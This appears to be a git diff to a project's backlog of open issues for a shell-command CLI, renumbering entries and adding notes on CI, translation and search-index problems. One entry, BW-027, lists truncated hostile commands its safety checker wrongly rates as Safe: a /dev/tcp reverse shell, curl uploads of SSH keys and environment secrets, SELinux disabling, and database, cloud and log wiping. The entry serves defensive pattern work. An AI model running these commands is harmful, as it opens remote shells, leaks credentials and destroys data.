@@ -19,6 +19,15 @@ Rules (see `.claude/rules/good-boy-scout.md` → "Stay in your lane"):
 
 ---
 
+### BW-041: OmniSearch inlines a 1.55 MB search index into every page
+
+**Found:** 2026-10-10, WCAG design pass (`feat/website-wcag-design-pass`)
+**Issue:** #1564
+**Status:** open
+**Needs human?:** no
+**Next step:** serve `search-index.json` statically and fetch it when the
+search overlay first opens (`website/src/components/OmniSearch.astro`).
+
 ### BW-002: CLAUDE.md version/MSRV drift, filed 42× (canonical + 41 duplicates)
 
 **Found:** 2026-09-27, PR #1470 session
@@ -224,24 +233,21 @@ users to `export CARO_MODEL=smollm-135m-q4`, which cannot download.
 **Needs human?:** no
 **Next step:** raise the `ls --version` timeout in `src/platform/mod.rs` to about 2 s; treat a timeout as unknown in `detect_bsd_utils`.
 
-### BW-026: an unquoted prompt that starts with "list" runs the `list` subcommand
+### BW-026: `Validate Translations` red on main: 13 locales lack playbook.json and waitlist.json
 
-**Found:** 2026-10-10, nightly CI triage (harness-plan session)
-**Issue:** #1550
+**Found:** 2026-10-02, PR #1507 session (also red on main push be07b22 and every i18n-touching PR)
+**Issue:** #1508
 **Status:** open
-**Needs human?:** yes (CLI design: subcommands win, prompt fallback, or reserved names)
-**Next step:** the maintainer picks an option in #1550. Until then,
-`e2e_smoke_test_suite` and `e2e_shell_operator_truncation` fail in all 4
-Extended Tests jobs; BW-015 hides them, because most tests fail on the model first.
+**Needs human?:** no (run `translate.yml` or copy the English files; or relax the validator for missing namespaces)
+**Next step:** `en/playbook.json` (#1174) and `en/waitlist.json` (#599) were never mirrored into 13 locales. CI runs the validator without `--strict`, so the missing-file errors are the failure; the 207 untranslated warnings are only fatal in strict mode.
 
-### BW-027: 8 stray `.worktrees/*` gitlinks on main, no `.gitmodules`
+### BW-027: static safety floor rates reverse shells, credential exfiltration and `DROP DATABASE` as Safe
 
-**Found:** 2026-10-10, nightly CI triage (harness-plan session)
-**Issue:** #1551
+**Found:** 2026-10-10, while stratifying the risk-gate gold subset (`docs/ml/risk-gold-subset.md`, "What the static floor got wrong")
+**Issue:** #1559
 **Status:** open
-**Needs human?:** no
-**Next step:** `git rm --cached` the 8 paths listed in #1551 (all added by
-`9599ca7`). `.gitignore` already covers `.worktrees/`.
+**Needs human?:** yes (safety patterns are a security-policy decision; not applied from a feature branch)
+**Next step:** `SafetyConfig::moderate()` returns `Safe` for `bash -i >& /dev/tcp/…`, `curl -F "key=@$HOME/.ssh/id_rsa" …`, `env | curl --data-binary @- …`, `sudo setenforce 0`, a uid-0 `useradd`, `mysql -e 'DROP DATABASE …'`, `redis-cli FLUSHALL`, `aws s3 rm --recursive`, `kubectl delete namespace`, `aws ec2 terminate-instances`, and `sudo truncate -s 0 /var/log/*.log`, while `rm -rf ./target` is `Critical`. The 121-row candidate file (`docs/ml/risk-gold-candidates.jsonl`) and its companion static-tier file (`docs/ml/risk-gold-static-tiers.jsonl`, joined on `id`) record each command and its static verdict; decide which gaps become patterns. BW-026 is reserved by #1507 (Validate Translations).
 
 ### BW-028: the CLA check never records a signature, so every external PR stays red
 
@@ -252,6 +258,25 @@ Extended Tests jobs; BW-015 hides them, because most tests fail on the model fir
 **Next step:** rename `custom-pr-sign-comment` to `custom-notsigned-prcomment` and set
 the one-line sign phrase, as #1555 shows. Then ask #1296, #1390 and #1415 to comment
 `recheck`.
+
+### BW-029: an unquoted prompt that starts with "list" runs the `list` subcommand
+
+**Found:** 2026-10-10, nightly CI triage (harness-plan session)
+**Issue:** #1550
+**Status:** open
+**Needs human?:** yes (CLI design: subcommands win, prompt fallback, or reserved names)
+**Next step:** the maintainer picks an option in #1550. Until then,
+`e2e_smoke_test_suite` and `e2e_shell_operator_truncation` fail in all 4
+Extended Tests jobs; BW-015 hides them, because most tests fail on the model first.
+
+### BW-030: 8 stray `.worktrees/*` gitlinks on main, no `.gitmodules`
+
+**Found:** 2026-10-10, nightly CI triage (harness-plan session)
+**Issue:** #1551
+**Status:** open
+**Needs human?:** no
+**Next step:** `git rm --cached` the 8 paths listed in #1551 (all added by
+`9599ca7`). `.gitignore` already covers `.worktrees/`.
 
 ### BW-031: ai_horde `Client-Agent` header hardcoded to `caro:1.4.0`
 
